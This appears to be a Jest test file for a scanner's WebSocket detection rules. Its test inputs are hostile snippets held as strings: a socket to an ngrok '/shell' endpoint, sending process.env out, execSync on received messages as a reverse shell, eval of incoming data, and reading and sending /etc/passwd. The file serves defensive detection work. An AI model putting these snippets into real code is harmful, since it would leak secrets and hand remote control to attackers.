/**
 * Tests for WebSocket malicious pattern detection
 * Issue #3: Scanner rule for malicious WebSocket handlers
 */

import { DANGEROUS_PATTERNS } from '../patterns';

// Get WebSocket patterns
const wsPatterns = DANGEROUS_PATTERNS.filter(p => p.category === 'websocket');

describe('WebSocket Detection Rules', () => {
  
  // Test 1: Suspicious endpoint detection
  test('WS_SUSPICIOUS_ENDPOINT: detects WebSocket to ngrok', () => {
    const code = `const ws = new WebSocket('wss://abc123.ngrok.io/shell');`;
    const pattern = wsPatterns.find(p => p.id === 'WS_SUSPICIOUS_ENDPOINT');
    expect(pattern?.pattern.test(code)).toBe(true);
  });

  test('WS_SUSPICIOUS_ENDPOINT: detects dynamic WebSocket URL', () => {
    const code = `const ws = new WebSocket(config.wsUrl);`;
    const pattern = wsPatterns.find(p => p.id === 'WS_SUSPICIOUS_ENDPOINT');
    pattern!.pattern.lastIndex = 0;
    expect(pattern?.pattern.test(code)).toBe(true);
  });

  // Test 2: Data exfiltration detection
  test('WS_DATA_EXFIL: detects env exfiltration via WebSocket', () => {
    const code = `ws.send(JSON.stringify(process.env));`;
    const pattern = wsPatterns.find(p => p.id === 'WS_DATA_EXFIL');
    expect(pattern?.pattern.test(code)).toBe(true);
  });

  test('WS_DATA_EXFIL: detects base64 encoded data send', () => {
    const code = `ws.send(Buffer.from(secretData).toString('base64'));`;
    const pattern = wsPatterns.find(p => p.id === 'WS_DATA_EXFIL');
    pattern!.pattern.lastIndex = 0;
    expect(pattern?.pattern.test(code)).toBe(true);
  });

  // Test 3: Reverse shell detection
  test('WS_REVERSE_SHELL: detects exec in WebSocket handler', () => {
    const code = `
      ws.on('message', (cmd) => {
        const result = execSync(cmd);
        ws.send(result);
      });
    `;
    const pattern = wsPatterns.find(p => p.id === 'WS_REVERSE_SHELL');
    expect(pattern?.pattern.test(code)).toBe(true);
  });

  // Test 4: C2 communication detection
  test('WS_C2_PATTERN: detects eval in WebSocket message handler', () => {
    const code = `
      socket.onmessage = (event) => {
        eval(event.data);
      };
    `;
    const pattern = wsPatterns.find(p => p.id === 'WS_C2_PATTERN');
    expect(pattern?.pattern.test(code)).toBe(true);
  });

  // Test 5: Bidirectional exfiltration
  test('WS_BIDIRECTIONAL_EXFIL: detects file read + send pattern', () => {
    const code = `
      const data = fs.readFileSync('/etc/passwd');
      ws.send(data);
    `;
    const pattern = wsPatterns.find(p => p.id === 'WS_BIDIRECTIONAL_EXFIL');
    expect(pattern?.pattern.test(code)).toBe(true);
  });

  // Negative tests - should NOT match legitimate code
  test('should not flag legitimate WebSocket usage', () => {
    const legitimateCode = `
      const ws = new WebSocket('wss://api.example.com/stream');
      ws.onmessage = (event) => {
        console.log(event.data);
        updateUI(JSON.parse(event.data));
      };
    `;
    
    const criticalPatterns = wsPatterns.filter(p => p.severity === 'critical');
    criticalPatterns.forEach(pattern => {
      pattern.pattern.lastIndex = 0;
      expect(pattern.pattern.test(legitimateCode)).toBe(false);
    });
  });
});
